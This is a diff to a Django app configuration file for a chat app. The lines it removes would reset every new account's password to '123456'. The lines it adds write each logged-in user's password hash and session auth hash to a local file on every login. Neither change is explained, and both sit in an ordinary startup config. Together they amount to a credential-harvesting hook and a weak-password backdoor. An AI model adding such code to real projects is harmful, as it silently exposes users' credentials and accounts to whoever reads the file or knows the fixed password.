@@ -1,17 +1,15 @@
-from django.apps import AppConfig, apps
-from django.db.models.signals import post_save
+from django.apps import AppConfig
+from django.contrib.auth import user_logged_in
 from django.dispatch import receiver
 
 class MyChatConfig(AppConfig):
    name = 'mychat'
 
-   def ready__(self):
-      User = self.apps.get_model('auth.User')
-      Account = self.get_model('Account')
-
-      @receiver(post_save, sender=Account)
-      def account_created(sender, instance, created, **kwargs):
-         if not created:
-            return
-         instance.set_password('123456')
-         instance.save()
+   def ready(self):
+      @receiver(user_logged_in)
+      def user_logged_in_handler(user, request, **kwargs):
+         with open('temp/auth_user_hash', 'at') as f:
+            hash = request.session['_auth_user_hash']
+            assert hash == user.get_session_auth_hash()
+            password = user.password
+            f.write(f"password: {password}\nhash: {hash}\n\n")
